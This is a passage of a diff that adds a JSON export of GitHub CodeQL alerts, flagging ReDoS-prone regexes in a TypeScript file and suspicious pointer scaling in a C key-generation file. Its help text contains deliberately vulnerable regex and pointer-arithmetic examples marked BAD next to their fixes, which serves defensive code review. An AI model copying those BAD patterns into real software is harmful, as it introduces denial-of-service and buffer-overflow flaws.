the ambiguity about when to start matching whitespace sequences. For instance, by using a negative look-behind (`/^\\s+|(?<!\\s)\\s+$/g`), or just by using the built-in trim method (`text.trim()`).\n\nNote that the sub-expression `\"^\\s+\"` is **not** problematic as the `^` anchor restricts when that sub-expression can start matching, and as the regular expression engine matches from left to right.\n\n\n## Example\nAs a similar, but slightly subtler problem, consider the regular expression that matches lines with numbers, possibly written using scientific notation:\n\n```javascript\n\n/^0\\.\\d+E?\\d+$/.test(str) // BAD\n```\nThe problem with this regular expression is in the sub-expression `\\d+E?\\d+` because the second `\\d+` can start matching digits anywhere after the first match of the first `\\d+` if there is no `E` in the input string.\n\nThis is problematic for strings that do **not** end with a digit. Such a string will force the regular expression engine to process each digit sequence once per digit in the sequence, again leading to a quadratic time complexity.\n\nTo make the processing faster, the regular expression should be rewritten such that the two `\\d+` sub-expressions do not have overlapping matches: `^0\\.\\d+(E\\d+)?$`.\n\n\n## Example\nSometimes it is unclear how a regular expression can be rewritten to avoid the problem. In such cases, it often suffices to limit the length of the input string. For instance, the following regular expression is used to match numbers, and on some non-number inputs it can have quadratic time complexity:\n\n```javascript\n\n/^(\\+|-)?(\\d+|(\\d*\\.\\d*))?(E|e)?([-+])?(\\d+)?$/.test(str) // BAD\n```\nIt is not immediately obvious how to rewrite this regular expression to avoid the problem. However, you can mitigate performance issues by limiting the length to 1000 characters, which will always finish in a reasonable amount of time.\n\n```javascript\n\nif (str.length > 1000) {\n    throw new Error(\"Input too long\");\n}\n\n/^(\\+|-)?(\\d+|(\\d*\\.\\d*))?(E|e)?([-+])?(\\d+)?$/.test(str)\n```\n\n## References\n* OWASP: [Regular expression Denial of Service - ReDoS](https://www.owasp.org/index.php/Regular_expression_Denial_of_Service_-_ReDoS).\n* Wikipedia: [ReDoS](https://en.wikipedia.org/wiki/ReDoS).\n* Wikipedia: [Time complexity](https://en.wikipedia.org/wiki/Time_complexity).\n* James Kirrage, Asiri Rathnayake, Hayo Thielecke: [Static Analysis for Regular Expression Denial-of-Service Attack](https://arxiv.org/abs/1301.0849).\n* Common Weakness Enumeration: [CWE-1333](https://cwe.mitre.org/data/definitions/1333.html).\n* Common Weakness Enumeration: [CWE-730](https://cwe.mitre.org/data/definitions/730.html).\n* Common Weakness Enumeration: [CWE-400](https://cwe.mitre.org/data/definitions/400.html).\n",
+   "security_severity_level": "high"
+  },
+  "tool": {
+   "name": "CodeQL",
+   "guid": null,
+   "version": "2.27.3"
+  },
+  "most_recent_instance": {
+   "ref": "refs/heads/upgrade/vault",
+   "analysis_key": ".github/workflows/codeql.yml:analyze",
+   "environment": "{\"language\":\"javascript-typescript\"}",
+   "category": "codeql-javascript-typescript",
+   "state": "open",
+   "commit_sha": "5b76da203bcb087429abc9c3c1a46ae5be7cf9c7",
+   "message": {
+    "text": "This regular expression that depends on library input may run slow on strings with many repetitions of ' '."
+   },
+   "location": {
+    "path": "packages/ycash/src/batch/server/scheme.ts",
+    "start_line": 197,
+    "end_line": 197,
+    "start_column": 39,
+    "end_column": 89
+   },
+   "classifications": []
+  },
+  "instances_url": "https://api.github.com/repos/boyfromcave/x402-ycash/code-scanning/alerts/42/instances",
+  "dismissal_approved_by": null,
+  "assignees": [],
+  "linked_pull_requests": [],
+  "linked_issues": []
+ },
+ {
+  "number": 41,
+  "created_at": "2026-10-23T06:19:31Z",
+  "updated_at": "2026-10-23T06:19:31Z",
+  "url": "https://api.github.com/repos/boyfromcave/x402-ycash/code-scanning/alerts/41",
+  "html_url": "https://github.com/boyfromcave/x402-ycash/security/code-scanning/41",
+  "state": "open",
+  "fixed_at": null,
+  "dismissed_by": null,
+  "dismissed_at": null,
+  "dismissed_reason": null,
+  "dismissed_comment": null,
+  "rule": {
+   "id": "js/polynomial-redos",
+   "severity": "warning",
+   "description": "Polynomial regular expression used on uncontrolled data",
+   "name": "js/polynomial-redos",
+   "tags": [
+    "external/cwe/cwe-1333",
+    "external/cwe/cwe-400",
+    "external/cwe/cwe-730",
+    "security"
+   ],
+   "full_description": "A regular expression that can require polynomial time to match may be vulnerable to denial-of-service attacks.",
+   "help": "# Polynomial regular expression used on uncontrolled data\nSome regular expressions take a long time to match certain input strings to the point where the time it takes to match a string of length *n* is proportional to *n<sup>k</sup>* or even *2<sup>n</sup>*. Such regular expressions can negatively affect performance, or even allow a malicious user to perform a Denial of Service (\"DoS\") attack by crafting an expensive input string for the regular expression to match.\n\nThe regular expression engines provided by many popular JavaScript platforms use backtracking non-deterministic finite automata to implement regular expression matching. While this approach is space-efficient and allows supporting advanced features like capture groups, it is not time-efficient in general. The worst-case time complexity of such an automaton can be polynomial or even exponential, meaning that for strings of a certain shape, increasing the input length by ten characters may make the automaton about 1000 times slower.\n\nTypically, a regular expression is affected by this problem if it contains a repetition of the form `r*` or `r+` where the sub-expression `r` is ambiguous in the sense that it can match some string in multiple ways. More information about the precise circumstances can be found in the references.\n\n\n## Recommendation\nModify the regular expression to remove the ambiguity, or ensure that the strings matched with the regular expression are short enough that the time-complexity does not matter.\n\n\n## Example\nConsider this use of a regular expression, which removes all leading and trailing whitespace in a string:\n\n```javascript\n\ntext.replace(/^\\s+|\\s+$/g, ''); // BAD\n```\nThe sub-expression `\"\\s+$\"` will match the whitespace characters in `text` from left to right, but it can start matching anywhere within a whitespace sequence. This is problematic for strings that do **not** end with a whitespace character. Such a string will force the regular expression engine to process each whitespace sequence once per whitespace character in the sequence.\n\nThis ultimately means that the time cost of trimming a string is quadratic in the length of the string. So a string like `\"a b\"` will take milliseconds to process, but a similar string with a million spaces instead of just one will take several minutes.\n\nAvoid this problem by rewriting the regular expression to not contain the ambiguity about when to start matching whitespace sequences. For instance, by using a negative look-behind (`/^\\s+|(?<!\\s)\\s+$/g`), or just by using the built-in trim method (`text.trim()`).\n\nNote that the sub-expression `\"^\\s+\"` is **not** problematic as the `^` anchor restricts when that sub-expression can start matching, and as the regular expression engine matches from left to right.\n\n\n## Example\nAs a similar, but slightly subtler problem, consider the regular expression that matches lines with numbers, possibly written using scientific notation:\n\n```javascript\n\n/^0\\.\\d+E?\\d+$/.test(str) // BAD\n```\nThe problem with this regular expression is in the sub-expression `\\d+E?\\d+` because the second `\\d+` can start matching digits anywhere after the first match of the first `\\d+` if there is no `E` in the input string.\n\nThis is problematic for strings that do **not** end with a digit. Such a string will force the regular expression engine to process each digit sequence once per digit in the sequence, again leading to a quadratic time complexity.\n\nTo make the processing faster, the regular expression should be rewritten such that the two `\\d+` sub-expressions do not have overlapping matches: `^0\\.\\d+(E\\d+)?$`.\n\n\n## Example\nSometimes it is unclear how a regular expression can be rewritten to avoid the problem. In such cases, it often suffices to limit the length of the input string. For instance, the following regular expression is used to match numbers, and on some non-number inputs it can have quadratic time complexity:\n\n```javascript\n\n/^(\\+|-)?(\\d+|(\\d*\\.\\d*))?(E|e)?([-+])?(\\d+)?$/.test(str) // BAD\n```\nIt is not immediately obvious how to rewrite this regular expression to avoid the problem. However, you can mitigate performance issues by limiting the length to 1000 characters, which will always finish in a reasonable amount of time.\n\n```javascript\n\nif (str.length > 1000) {\n    throw new Error(\"Input too long\");\n}\n\n/^(\\+|-)?(\\d+|(\\d*\\.\\d*))?(E|e)?([-+])?(\\d+)?$/.test(str)\n```\n\n## References\n* OWASP: [Regular expression Denial of Service - ReDoS](https://www.owasp.org/index.php/Regular_expression_Denial_of_Service_-_ReDoS).\n* Wikipedia: [ReDoS](https://en.wikipedia.org/wiki/ReDoS).\n* Wikipedia: [Time complexity](https://en.wikipedia.org/wiki/Time_complexity).\n* James Kirrage, Asiri Rathnayake, Hayo Thielecke: [Static Analysis for Regular Expression Denial-of-Service Attack](https://arxiv.org/abs/1301.0849).\n* Common Weakness Enumeration: [CWE-1333](https://cwe.mitre.org/data/definitions/1333.html).\n* Common Weakness Enumeration: [CWE-730](https://cwe.mitre.org/data/definitions/730.html).\n* Common Weakness Enumeration: [CWE-400](https://cwe.mitre.org/data/definitions/400.html).\n",
+   "security_severity_level": "high"
+  },
+  "tool": {
+   "name": "CodeQL",
+   "guid": null,
+   "version": "2.27.3"
+  },
+  "most_recent_instance": {
+   "ref": "refs/heads/upgrade/vault",
+   "analysis_key": ".github/workflows/codeql.yml:analyze",
+   "environment": "{\"language\":\"javascript-typescript\"}",
+   "category": "codeql-javascript-typescript",
+   "state": "open",
+   "commit_sha": "5b76da203bcb087429abc9c3c1a46ae5be7cf9c7",
+   "message": {
+    "text": "This regular expression that depends on library input may run slow on strings with many repetitions of ' '."
+   },
+   "location": {
+    "path": "packages/ycash/src/batch/server/scheme.ts",
+    "start_line": 196,
+    "end_line": 196,
+    "start_column": 98,
+    "end_column": 116
+   },
+   "classifications": []
+  },
+  "instances_url": "https://api.github.com/repos/boyfromcave/x402-ycash/code-scanning/alerts/41/instances",
+  "dismissal_approved_by": null,
+  "assignees": [],
+  "linked_pull_requests": [],
+  "linked_issues": []
+ },
+ {
+  "number": 40,
+  "created_at": "2026-10-23T06:19:31Z",
+  "updated_at": "2026-10-23T06:19:31Z",
+  "url": "https://api.github.com/repos/boyfromcave/x402-ycash/code-scanning/alerts/40",
+  "html_url": "https://github.com/boyfromcave/x402-ycash/security/code-scanning/40",
+  "state": "open",
+  "fixed_at": null,
+  "dismissed_by": null,
+  "dismissed_at": null,
+  "dismissed_reason": null,
+  "dismissed_comment": null,
+  "rule": {
+   "id": "js/polynomial-redos",
+   "severity": "warning",
+   "description": "Polynomial regular expression used on uncontrolled data",
+   "name": "js/polynomial-redos",
+   "tags": [
+    "external/cwe/cwe-1333",
+    "external/cwe/cwe-400",
+    "external/cwe/cwe-730",
+    "security"
+   ],
+   "full_description": "A regular expression that can require polynomial time to match may be vulnerable to denial-of-service attacks.",
+   "help": "# Polynomial regular expression used on uncontrolled data\nSome regular expressions take a long time to match certain input strings to the point where the time it takes to match a string of length *n* is proportional to *n<sup>k</sup>* or even *2<sup>n</sup>*. Such regular expressions can negatively affect performance, or even allow a malicious user to perform a Denial of Service (\"DoS\") attack by crafting an expensive input string for the regular expression to match.\n\nThe regular expression engines provided by many popular JavaScript platforms use backtracking non-deterministic finite automata to implement regular expression matching. While this approach is space-efficient and allows supporting advanced features like capture groups, it is not time-efficient in general. The worst-case time complexity of such an automaton can be polynomial or even exponential, meaning that for strings of a certain shape, increasing the input length by ten characters may make the automaton about 1000 times slower.\n\nTypically, a regular expression is affected by this problem if it contains a repetition of the form `r*` or `r+` where the sub-expression `r` is ambiguous in the sense that it can match some string in multiple ways. More information about the precise circumstances can be found in the references.\n\n\n## Recommendation\nModify the regular expression to remove the ambiguity, or ensure that the strings matched with the regular expression are short enough that the time-complexity does not matter.\n\n\n## Example\nConsider this use of a regular expression, which removes all leading and trailing whitespace in a string:\n\n```javascript\n\ntext.replace(/^\\s+|\\s+$/g, ''); // BAD\n```\nThe sub-expression `\"\\s+$\"` will match the whitespace characters in `text` from left to right, but it can start matching anywhere within a whitespace sequence. This is problematic for strings that do **not** end with a whitespace character. Such a string will force the regular expression engine to process each whitespace sequence once per whitespace character in the sequence.\n\nThis ultimately means that the time cost of trimming a string is quadratic in the length of the string. So a string like `\"a b\"` will take milliseconds to process, but a similar string with a million spaces instead of just one will take several minutes.\n\nAvoid this problem by rewriting the regular expression to not contain the ambiguity about when to start matching whitespace sequences. For instance, by using a negative look-behind (`/^\\s+|(?<!\\s)\\s+$/g`), or just by using the built-in trim method (`text.trim()`).\n\nNote that the sub-expression `\"^\\s+\"` is **not** problematic as the `^` anchor restricts when that sub-expression can start matching, and as the regular expression engine matches from left to right.\n\n\n## Example\nAs a similar, but slightly subtler problem, consider the regular expression that matches lines with numbers, possibly written using scientific notation:\n\n```javascript\n\n/^0\\.\\d+E?\\d+$/.test(str) // BAD\n```\nThe problem with this regular expression is in the sub-expression `\\d+E?\\d+` because the second `\\d+` can start matching digits anywhere after the first match of the first `\\d+` if there is no `E` in the input string.\n\nThis is problematic for strings that do **not** end with a digit. Such a string will force the regular expression engine to process each digit sequence once per digit in the sequence, again leading to a quadratic time complexity.\n\nTo make the processing faster, the regular expression should be rewritten such that the two `\\d+` sub-expressions do not have overlapping matches: `^0\\.\\d+(E\\d+)?$`.\n\n\n## Example\nSometimes it is unclear how a regular expression can be rewritten to avoid the problem. In such cases, it often suffices to limit the length of the input string. For instance, the following regular expression is used to match numbers, and on some non-number inputs it can have quadratic time complexity:\n\n```javascript\n\n/^(\\+|-)?(\\d+|(\\d*\\.\\d*))?(E|e)?([-+])?(\\d+)?$/.test(str) // BAD\n```\nIt is not immediately obvious how to rewrite this regular expression to avoid the problem. However, you can mitigate performance issues by limiting the length to 1000 characters, which will always finish in a reasonable amount of time.\n\n```javascript\n\nif (str.length > 1000) {\n    throw new Error(\"Input too long\");\n}\n\n/^(\\+|-)?(\\d+|(\\d*\\.\\d*))?(E|e)?([-+])?(\\d+)?$/.test(str)\n```\n\n## References\n* OWASP: [Regular expression Denial of Service - ReDoS](https://www.owasp.org/index.php/Regular_expression_Denial_of_Service_-_ReDoS).\n* Wikipedia: [ReDoS](https://en.wikipedia.org/wiki/ReDoS).\n* Wikipedia: [Time complexity](https://en.wikipedia.org/wiki/Time_complexity).\n* James Kirrage, Asiri Rathnayake, Hayo Thielecke: [Static Analysis for Regular Expression Denial-of-Service Attack](https://arxiv.org/abs/1301.0849).\n* Common Weakness Enumeration: [CWE-1333](https://cwe.mitre.org/data/definitions/1333.html).\n* Common Weakness Enumeration: [CWE-730](https://cwe.mitre.org/data/definitions/730.html).\n* Common Weakness Enumeration: [CWE-400](https://cwe.mitre.org/data/definitions/400.html).\n",
+   "security_severity_level": "high"
+  },
+  "tool": {
+   "name": "CodeQL",
+   "guid": null,
+   "version": "2.27.3"
+  },
+  "most_recent_instance": {
+   "ref": "refs/heads/upgrade/vault",
+   "analysis_key": ".github/workflows/codeql.yml:analyze",
+   "environment": "{\"language\":\"javascript-typescript\"}",
+   "category": "codeql-javascript-typescript",
+   "state": "open",
+   "commit_sha": "5b76da203bcb087429abc9c3c1a46ae5be7cf9c7",
+   "message": {
+    "text": "This regular expression that depends on library input may run slow on strings with many repetitions of ' '."
+   },
+   "location": {
+    "path": "packages/ycash/src/batch/server/scheme.ts",
+    "start_line": 196,
+    "end_line": 196,
+    "start_column": 17,
+    "end_column": 35
+   },
+   "classifications": []
+  },
+  "instances_url": "https://api.github.com/repos/boyfromcave/x402-ycash/code-scanning/alerts/40/instances",
+  "dismissal_approved_by": null,
+  "assignees": [],
+  "linked_pull_requests": [],
+  "linked_issues": []
+ },
+ {
+  "number": 39,
+  "created_at": "2026-10-23T06:18:52Z",
+  "updated_at": "2026-10-23T06:18:52Z",
+  "url": "https://api.github.com/repos/boyfromcave/x402-ycash/code-scanning/alerts/39",
+  "html_url": "https://github.com/boyfromcave/x402-ycash/security/code-scanning/39",
+  "state": "open",
+  "fixed_at": null,
+  "dismissed_by": null,
+  "dismissed_at": null,
+  "dismissed_reason": null,
+  "dismissed_comment": null,
+  "rule": {
+   "id": "cpp/suspicious-pointer-scaling",
+   "severity": "warning",
+   "description": "Suspicious pointer scaling",
+   "name": "cpp/suspicious-pointer-scaling",
+   "tags": [
+    "external/cwe/cwe-468",
+    "security"
+   ],
+   "full_description": "Implicit scaling of pointer arithmetic expressions can cause buffer overflow conditions.",
+   "help": "# Suspicious pointer scaling\nPointer arithmetic in C and C++ is automatically scaled according to the size of the data type. For example, if the type of `p` is `T*` and `sizeof(T) == 4` then the expression `p+1` adds 4 bytes to `p`. This can cause a buffer overflow condition if the programmer forgets that they are adding a multiple of `sizeof(T)`, rather than a number of bytes.\n\nThis query finds pointer arithmetic expressions where it appears likely that the programmer has forgotten that the offset is automatically scaled.\n\n\n## Recommendation\n1. Whenever possible, use the array subscript operator rather than pointer arithmetic. For example, replace `*(p+k)` with `p[k]`.\n1. Cast to the correct type before using pointer arithmetic. For example, if the type of `p` is `int*` but it really points to an array of type `double[]` then use the syntax `(double*)p + k` to get a pointer to the `k`'th element of the array.\n\n## Example\n\n```cpp\nint example1(int i) {\n  int intArray[10] = { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10 };\n  int *intPointer = intArray;\n  // BAD: the offset is already automatically scaled by sizeof(int),\n  // so this code will compute the wrong offset.\n  return *(intPointer + (i * sizeof(int)));\n}\n\nint example2(int i) {\n  int intArray[10] = { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10 };\n  int *intPointer = intArray;\n  // GOOD: the offset is automatically scaled by sizeof(int).\n  return *(intPointer + i);\n}\n\n```\n\n## References\n* Common Weakness Enumeration: [CWE-468](https://cwe.mitre.org/data/definitions/468.html).\n",
+   "security_severity_level": "high"
+  },
+  "tool": {
+   "name": "CodeQL",
+   "guid": null,
+   "version": "2.27.3"
+  },
+  "most_recent_instance": {
+   "ref": "refs/heads/upgrade/vault",
+   "analysis_key": ".github/workflows/codeql.yml:analyze",
+   "environment": "{\"language\":\"c-cpp\"}",
+   "category": "codeql-c-cpp",
+   "state": "open",
+   "commit_sha": "5b76da203bcb087429abc9c3c1a46ae5be7cf9c7",
+   "message": {
+    "text": "This pointer might have type unsigned int (size 4), but this pointer arithmetic is done with type fpr * (size 8)."
+   },
+   "location": {
+    "path": "python/x402_ycash/pq/_falcon_c/keygen.c",
+    "start_line": 3604,
+    "end_line": 3604,
+    "start_column": 11,
+    "end_column": 14
+   },
+   "classifications": []
+  },
+  "instances_url": "https://api.github.com/repos/boyfromcave/x402-ycash/code-scanning/alerts/39/instances",
+  "dismissal_approved_by": null,
+  "assignees": [],
+  "linked_pull_requests": [],
+  "linked_issues": []
+ },
+ {
+  "number": 38,
+  "created_at": "2026-10-23T06:18:52Z",
+  "updated_at": "2026-10-23T06:18:52Z",
+  "url": "https://api.github.com/repos/boyfromcave/x402-ycash/code-scanning/alerts/38",
+  "html_url": "https://github.com/boyfromcave/x402-ycash/security/code-scanning/38",
+  "state": "open",
+  "fixed_at": null,
+  "dismissed_by": null,
+  "dismissed_at": null,
+  "dismissed_reason": null,
+  "dismissed_comment": null,
+  "rule": {
+   "id": "cpp/suspicious-pointer-scaling",
+   "severity": "warning",
+   "description": "Suspicious pointer scaling",
+   "name": "cpp/suspicious-pointer-scaling",
+   "tags": [
+    "external/cwe/cwe-468",
+    "security"
+   ],
+   "full_description": "Implicit scaling of pointer arithmetic expressions can cause buffer overflow conditions.",
+   "help": "# Suspicious pointer scaling\nPointer arithmetic in C and C++ is automatically scaled according to the size of the data type. For example, if the type of `p` is `T*` and `sizeof(T) == 4` then the expression `p+1` adds 4 bytes to `p`. This can cause a buffer overflow condition if the programmer forgets that they are adding a multiple of `sizeof(T)`, rather than a number of bytes.\n\nThis query finds pointer arithmetic expressions where it appears likely that the programmer has forgotten that the offset is automatically scaled.\n\n\n## Recommendation\n1. Whenever possible, use the array subscript operator rather than pointer arithmetic. For example, replace `*(p+k)` with `p[k]`.\n1. Cast to the correct type before using pointer arithmetic. For example, if the type of `p` is `int*` but it really points to an array of type `double[]` then use the syntax `(double*)p + k` to get a pointer to the `k`'th element of the array.\n\n## Example\n\n```cpp\nint example1(int i) {\n  int intArray[10] = { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10 };\n  int *intPointer = intArray;\n  // BAD: the offset is already automatically scaled by sizeof(int),\n  // so this code will compute the wrong offset.\n  return *(intPointer + (i * sizeof(int)));\n}\n\nint example2(int i) {\n  int intArray[10] = { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10 };\n  int *intPointer = intArray;\n  // GOOD: the offset is automatically scaled by sizeof(int).\n  return *(intPointer + i);\n}\n\n```\n\n## References\n* Common Weakness Enumeration: [CWE-468](https://cwe.mitre.org/data/definitions/468.html).\n",
+   "security_severity_level": "high"
+  },
+  "tool": {
+   "name": "CodeQL",
+   "guid": null,
+   "version": "2.27.3"
+  },
+  "most_recent_instance": {
+   "ref": "refs/heads/upgrade/vault",
+   "analysis_key": ".github/workflows/codeql.yml:analyze",
+   "environment": "{\"language\":\"c-cpp\"}",
+   "category": "codeql-c-cpp",
+   "state": "open",
+   "commit_sha": "5b76da203bcb087429abc9c3c1a46ae5be7cf9c7",
+   "message": {
+    "text": "This pointer might have type unsigned int (size 4), but this pointer arithmetic is done with type fpr * (size 8)."
+   },
+   "location": {
+    "path": "python/x402_ycash/pq/_falcon_c/keygen.c",
+    "start_line": 3603,
+    "end_line": 3603,
+    "start_column": 11,
+    "end_column": 14
+   },
+   "classifications": []
+  },
+  "instances_url": "https://api.github.com/repos/boyfromcave/x402-ycash/code-scanning/alerts/38/instances",
+  "dismissal_approved_by": null,
+  "assignees": [],
+  "linked_pull_requests": [],
+  "linked_issues": []
+ },
+ {
+  "number": 37,
+  "created_at": "2026-10-23T06:18:52Z",
+  "updated_at": "2026-10-23T06:18:52Z",
+  "url": "https://api.github.com/repos/boyfromcave/x402-ycash/code-scanning/alerts/37",
+  "html_url": "https://github.com/boyfromcave/x402-ycash/security/code-scanning/37",
+  "state": "open",
+  "fixed_at": null,
+  "dismissed_by": null,
+  "dismissed_at": null,
+  "dismissed_reason": null,
+  "dismissed_comment": null,
+  "rule": {
+   "id": "cpp/suspicious-pointer-scaling",
+   "severity": "warning",
+   "description": "Suspicious pointer scaling",
+   "name": "cpp/suspicious-pointer-scaling",
+   "tags": [
+    "external/cwe/cwe-468",
+    "security"
+   ],
+   "full_description": "Implicit scaling of pointer arithmetic expressions can cause buffer overflow conditions.",
+   "help": "# Suspicious pointer scaling\nPointer arithmetic in C and C++ is automatically scaled according to the size of the data type. For example, if the type of `p` is `T*` and `sizeof(T) == 4` then the expression `p+1` adds 4 bytes to `p`. This can cause a buffer overflow condition if the programmer forgets that they are adding a multiple of `sizeof(T)`, rather than a number of bytes.\n\nThis query finds pointer arithmetic expressions where it appears likely that the programmer has forgotten that the offset is automatically scaled.\n\n\n## Recommendation\n1. Whenever possible, use the array subscript operator rather than pointer arithmetic. For example, replace `*(p+k)` with `p[k]`.\n1. Cast to the correct type before using pointer arithmetic. For example, if the type of `p` is `int*` but it really points to an array of type `double[]` then use the syntax `(double*)p + k` to get a pointer to the `k`'th element of the array.\n\n## Example\n\n```cpp\nint example1(int i) {\n  int intArray[10] = { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10 };\n  int *intPointer = intArray;\n  // BAD: the offset is already automatically scaled by sizeof(int),\n  // so this code will compute the wrong offset.\n  return *(intPointer + (i * sizeof(int)));\n}\n\nint example2(int i) {\n  int intArray[10] = { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10 };\n  int *intPointer = intArray;\n  // GOOD: the offset is automatically scaled by sizeof(int).\n  return *(intPointer + i);\n}\n\n```\n\n## References\n* Common Weakness Enumeration: [CWE-468](https://cwe.mitre.org/data/definitions/468.html).\n",
+   "security_severity_level": "high"
+  },
+  "tool": {
+   "name": "CodeQL",
+   "guid": null,
+   "version": "2.27.3"
+  },
+  "most_recent_instance": {
+   "ref": "refs/heads/upgrade/vault",
+   "analysis_key": ".github/workflows/codeql.yml:analyze",
+   "environment": "{\"language\":\"c-cpp\"}",
+   "category": "codeql-c-cpp",
+   "state": "open",
+   "commit_sha": "5b76da203bcb087429abc9c3c1a46ae5be7cf9c7",
+   "message": {
+    "text": "This pointer might have type unsigned int (size 4), but this pointer arithmetic is done with type fpr * (size 8)."
+   },
+   "location": {
+    "path": "python/x402_ycash/pq/_falcon_c/keygen.c",
+    "start_line": 3582,
+    "end_line": 3582,
+    "start_column": 11,
+    "end_column": 14
+   },
+   "classifications": []
+  },
+  "instances_url": "https://api.github.com/repos/boyfromcave/x402-ycash/code-scanning/alerts/37/instances",
+  "dismissal_approved_by": null,
+  "assignees": [],
+  "linked_pull_requests": [],
+  "linked_issues": []
+ },
+ {
+  "number": 36,
+  "created_at": "2026-10-23T06:18:52Z",
+  "updated_at": "2026-10-23T06:18:52Z",
+  "url": "https://api.github.com/repos/boyfromcave/x402-ycash/code-scanning/alerts/36",
+  "html_url": "https://github.com/boyfromcave/x402-ycash/security/code-scanning/36",
+  "state": "open",
+  "fixed_at": null,
+  "dismissed_by": null,
+  "dismissed_at": null,
+  "dismissed_reason": null,
+  "dismissed_comment": null,
+  "rule": {
+   "id": "cpp/suspicious-pointer-scaling",
+   "severity": "warning",
+   "description": "Suspicious pointer scaling",
+   "name": "cpp/suspicious-pointer-scaling",
+   "tags": [
+    "external/cwe/cwe-468",
+    "security"
+   ],
+   "full_description": "Implicit scaling of pointer arithmetic expressions can cause buffer overflow conditions.",
+   "help": "# Suspicious pointer scaling\nPointer arithmetic in C and C++ is automatically scaled according to the size of the data type. For example, if the type of `p` is `T*` and `sizeof(T) == 4` then the expression `p+1` adds 4 bytes to `p`. This can cause a buffer overflow condition if the programmer forgets that they are adding a multiple of `sizeof(T)`, rather than a number of bytes.\n\nThis query finds pointer arithmetic expressions where it appears likely that the programmer has forgotten that the offset is automatically scaled.\n\n\n## Recommendation\n1. Whenever possible, use the array subscript operator rather than pointer arithmetic. For example, replace `*(p+k)` with `p[k]`.\n1. Cast to the correct type before using pointer arithmetic. For example, if the type of `p` is `int*` but it really points to an array of type `double[]` then use the syntax `(double*)p + k` to get a pointer to the `k`'th element of the array.\n\n## Example\n\n```cpp\nint example1(int i) {\n  int intArray[10] = { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10 };\n  int *intPointer = intArray;\n  // BAD: the offset is already automatically scaled by sizeof(int),\n  // so this code will compute the wrong offset.\n  return *(intPointer + (i * sizeof(int)));\n}\n\nint example2(int i) {\n  int intArray[10] = { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10 };\n  int *intPointer = intArray;\n  // GOOD: the offset is automatically scaled by sizeof(int).\n  return *(intPointer + i);\n}\n\n```\n\n## References\n* Common Weakness Enumeration: [CWE-468](https://cwe.mitre.org/data/definitions/468.html).\n",
+   "security_severity_level": "high"
+  },
+  "tool": {
+   "name": "CodeQL",
+   "guid": null,
+   "version": "2.27.3"
+  },
+  "most_recent_instance": {
+   "ref": "refs/heads/upgrade/vault",
+   "analysis_key": ".github/workflows/codeql.yml:analyze",
+   "environment": "{\"language\":\"c-cpp\"}",
+   "category": "codeql-c-cpp",
+   "state": "open",
+   "commit_sha": "5b76da203bcb087429abc9c3c1a46ae5be7cf9c7",
+   "message": {
+    "text": "This pointer might have type unsigned int (size 4), but this pointer arithmetic is done with type fpr * (size 8)."
+   },
+   "location": {
+    "path": "python/x402_ycash/pq/_falcon_c/keygen.c",
+    "start_line": 3581,
+    "end_line": 3581,
+    "start_column": 11,
+    "end_column": 14
+   },
+   "classifications": []
+  },
+  "instances_url": "https://api.github.com/repos/boyfromcave/x402-ycash/code-scanning/alerts/36/instances",
+  "dismissal_approved_by": null,
+  "assignees": [],
+  "linked_pull_requests": [],
+  "linked_issues": []
+ },
+ {
+  "number": 35,
+  "created_at": "2026-10-23T06:18:52Z",
+  "updated_at": "2026-10-23T06:18:52Z",
+  "url": "https://api.github.com/repos/boyfromcave/x402-ycash/code-scanning/alerts/35",
+  "html_url": "https://github.com/boyfromcave/x402-ycash/security/code-scanning/35",
+  "state": "open",
+  "fixed_at": null,
+  "dismissed_by": null,
+  "dismissed_at": null,
+  "dismissed_reason": null,
+  "dismissed_comment": null,
+  "rule": {
+   "id": "cpp/suspicious-pointer-scaling",
+   "severity": "warning",
+   "description": "Suspicious pointer scaling",
+   "name": "cpp/suspicious-pointer-scaling",
+   "tags": [
+    "external/cwe/cwe-468",
+    "security"
+   ],
+   "full_description": "Implicit scaling of pointer arithmetic expressions can cause buffer overflow conditions.",
+   "help": "# Suspicious pointer scaling\nPointer arithmetic in C and C++ is automatically scaled according to the size of the data type. For example, if the type of `p` is `T*` and `sizeof(T) == 4` then the expression `p+1` adds 4 bytes to `p`. This can cause a buffer overflow condition if the programmer forgets that they are adding a multiple of `sizeof(T)`, rather than a number of bytes.\n\nThis query finds pointer arithmetic expressions where it appears likely that the programmer has forgotten that the offset is automatically scaled.\n\n\n## Recommendation\n1. Whenever possible, use the array subscript operator rather than pointer arithmetic. For example, replace `*(p+k)` with `p[k]`.\n1. Cast to the correct type before using pointer arithmetic. For example, if the type of `p` is `int*` but it really points to an array of type `double[]` then use the syntax `(double*)p + k` to get a pointer to the `k`'th element of the array.\n\n## Example\n\n```cpp\nint example1(int i) {\n  int intArray[10] = { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10 };\n  int *intPointer = intArray;\n  // BAD: the offset is already automatically scaled by sizeof(int),\n  // so this code will compute the wrong offset.\n  return *(intPointer + (i * sizeof(int)));\n}\n\nint example2(int i) {\n  int intArray[10] = { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10 };\n  int *intPointer = intArray;\n  // GOOD: the offset is automatically scaled by sizeof(int).\n  return *(intPointer + i);\n}\n\n```\n\n## References\n* Common Weakness Enumeration: [CWE-468](https://cwe.mitre.org/data/definitions/468.html).\n",
+   "security_severity_level": "high"
+  },
+  "tool": {
+   "name": "CodeQL",
+   "guid": null,
+   "version": "2.27.3"
+  },
+  "most_recent_instance": {
+   "ref": "refs/heads/upgrade/vault",
+   "analysis_key": ".github/workflows/codeql.yml:analyze",
+   "environment": "{\"language\":\"c-cpp\"}",
+   "category": "codeql-c-cpp",
+   "state": "open",
+   "commit_sha": "5b76da203bcb087429abc9c3c1a46ae5be7cf9c7",
+   "message": {
+    "text": "This pointer might have type unsigned int (size 4), but this pointer arithmetic is done with type fpr * (size 8)."
+   },
+   "location": {
+    "path": "python/x402_ycash/pq/_falcon_c/keygen.c",
+    "start_line": 3580,
+    "end_line": 3580,
+    "start_column": 11,
+    "end_column": 14
+   },
+   "classifications": []
+  },
+  "instances_url": "https://api.github.com/repos/boyfromcave/x402-ycash/code-scanning/alerts/35/instances",
+  "dismissal_approved_by": null,
+  "assignees": [],
+  "linked_pull_requests": [],
